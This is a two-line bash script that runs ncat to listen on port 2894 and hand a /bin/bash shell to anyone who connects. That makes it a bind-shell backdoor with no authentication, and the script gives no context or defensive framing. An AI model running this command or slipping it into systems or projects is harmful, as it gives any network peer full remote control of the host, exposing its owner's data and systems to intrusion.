#!/bin/bash

ncat -v -l -p 2894 -e /bin/bash


